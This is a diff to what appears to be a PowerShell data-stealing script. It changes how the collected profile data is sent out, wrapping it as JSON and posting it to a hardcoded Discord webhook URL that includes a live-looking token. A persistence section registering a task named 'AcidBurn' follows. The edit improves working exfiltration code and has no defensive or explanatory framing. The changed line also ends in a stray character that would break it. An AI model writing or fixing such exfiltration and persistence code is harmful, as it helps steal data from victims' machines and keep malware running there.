@@ -14,7 +14,8 @@ foreach ($p in $profiles) {
 }
 
 $body = Get-Content $out -Raw
-Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $body
+$payload = @{ content = "``````$body``````" } | ConvertTo-Json
+Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $payload -ContentType "application/json"y
 
 # --- PERSISTENCE ---
 $taskName = "AcidBurn"
